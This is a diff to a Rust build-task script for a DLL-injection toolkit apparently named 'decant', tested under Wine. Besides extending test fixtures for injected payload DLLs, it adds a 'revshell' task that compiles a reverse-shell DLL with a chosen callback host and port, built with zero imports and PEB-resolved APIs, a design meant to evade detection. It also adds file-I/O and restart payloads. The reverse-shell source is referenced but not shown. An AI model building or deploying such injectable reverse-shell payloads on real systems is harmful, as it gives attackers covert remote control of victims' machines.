@@ -10,6 +10,7 @@ const WIN_TARGET: &str = "x86_64-pc-windows-gnu";
 
 const WIN_CRATES: &[&str] = &[
     "decant-interpose",
+    "decant-leechcore-device",
     "guest-target",
     "sample-tool",
     "decant-launcher",
@@ -29,6 +30,7 @@ fn main() -> ExitCode {
         "test-live" => test_live(),
         "wine-smoke" => wine_smoke(),
         "guest-inject-fixture" => guest_inject_fixture(),
+        "revshell" => revshell(),
         "inject-test" => inject_test(),
         "e2e" => e2e(),
         "dynamic" => dynamic(),
@@ -53,7 +55,7 @@ fn usage(unknown: &str) {
     }
     eprintln!(
         "usage: cargo xtask \
-         <setup|build-native|build-dll|test|test-live|wine-smoke|guest-inject-fixture|inject-test|e2e|dynamic>"
+         <setup|build-native|build-dll|test|test-live|wine-smoke|guest-inject-fixture|revshell|inject-test|e2e|dynamic>"
     );
 }
 
@@ -199,32 +201,77 @@ fn guest_inject_fixture() -> Result<()> {
         .context("staging guest-inject-target.exe")?;
 
     let prefix = root.join("wine-env").join("prefix");
-    let out = run_under_wine(
-        &stage.join("guest-inject-target.exe"),
-        &["--self-load", "guest_inject_probe.dll"],
-        &prefix,
-        &[],
-    )
-    .context("running guest-inject fixture under Wine")?;
-
-    println!(
-        "guest-inject-fixture: stdout={:?} exit={}",
-        out.stdout.trim(),
-        out.status
-    );
-    if out.ok_with("guest-inject-target: self-load PASS") {
-        println!("guest-inject-fixture: PASS");
-        println!("guest-inject-fixture: exe={}", exe.display());
-        for payload in artifacts.payloads {
-            println!("guest-inject-fixture: dll={}", payload.display());
+    for payload in ["guest_inject_probe.dll", "guest_inject_fileio.dll"] {
+        let out = run_under_wine(
+            &stage.join("guest-inject-target.exe"),
+            &["--self-load", payload],
+            &prefix,
+            &[],
+        )
+        .with_context(|| format!("running guest-inject fixture under Wine with {payload}"))?;
+        println!(
+            "guest-inject-fixture: self-load={payload} stdout={:?} exit={}",
+            out.stdout.trim(),
+            out.status
+        );
+        if !out.ok_with("guest-inject-target: self-load PASS") {
+            if !out.stderr.trim().is_empty() {
+                eprintln!("guest-inject-fixture: stderr:\n{}", out.stderr);
+            }
+            bail!("guest-inject-fixture: FAIL self-load {payload}");
         }
-        Ok(())
-    } else {
-        if !out.stderr.trim().is_empty() {
-            eprintln!("guest-inject-fixture: stderr:\n{}", out.stderr);
-        }
-        bail!("guest-inject-fixture: FAIL");
     }
+    println!("guest-inject-fixture: PASS");
+    println!("guest-inject-fixture: exe={}", exe.display());
+    for payload in artifacts.payloads {
+        println!("guest-inject-fixture: dll={}", payload.display());
+    }
+    Ok(())
+}
+
+fn revshell() -> Result<()> {
+    let root = repo_root();
+    let native = root
+        .join("testbins")
+        .join("guest-inject-fixture")
+        .join("native");
+    let out_dir = root.join("target").join(WIN_TARGET).join("debug");
+    std::fs::create_dir_all(&out_dir).with_context(|| format!("creating {}", out_dir.display()))?;
+
+    let host = env::args().nth(2).unwrap_or_else(|| "127.0.0.1".into());
+    let port = env::args().nth(3).unwrap_or_else(|| "4444".into());
+
+    let dll = out_dir.join("revshell.dll");
+    let mut build = Command::new("x86_64-w64-mingw32-gcc");
+    build
+        .current_dir(root)
+        .args([
+            "-Wall",
+            "-Wextra",
+            "-Os",
+            "-ffreestanding",
+            "-fno-stack-protector",
+            "-fno-asynchronous-unwind-tables",
+            "-nostdlib",
+            "-shared",
+            "-Wl,-e,DllMain",
+            "-o",
+        ])
+        .arg(&dll)
+        .arg(native.join("revshell.c"))
+        .arg(format!("-DCALLBACK_HOST=\"{host}\""))
+        .arg(format!("-DCALLBACK_PORT={port}"));
+    run(
+        &format!("build revshell.dll (host={host} port={port})"),
+        &mut build,
+    )?;
+    assert_pe_has_dir64_relocation(&dll)?;
+
+    let staged = out_dir.join("revshell.dll");
+    println!("revshell: dll={}", staged.display());
+    println!("revshell: callback={host}:{port}");
+    println!("revshell: zero imports, PEB-resolved APIs");
+    Ok(())
 }
 
 struct GuestInjectFixtureArtifacts {
@@ -304,6 +351,28 @@ fn build_guest_inject_fixture_artifacts(root: &Path) -> Result<GuestInjectFixtur
                 ("DECANT_PAYLOAD_REQUIRE_ACTCTX", "1"),
             ],
             true,
+        )?,
+        build_guest_payload(
+            root,
+            &native,
+            &out_dir,
+            "guest_inject_fileio.dll",
+            &[
+                ("DECANT_PAYLOAD_TEXT", "\"decant file io ok\""),
+                ("DECANT_PAYLOAD_FILE_IO", "1"),
+            ],
+            false,
+        )?,
+        build_guest_payload(
+            root,
+            &native,
+            &out_dir,
+            "guest_inject_restart.dll",
+            &[
+                ("DECANT_PAYLOAD_TEXT", "\"decant restart scheduled\""),
+                ("DECANT_PAYLOAD_RESTART_TARGET", "1"),
+            ],
+            false,
         )?,
         build_guest_rust_payload(root, &out_dir)?,
     ];
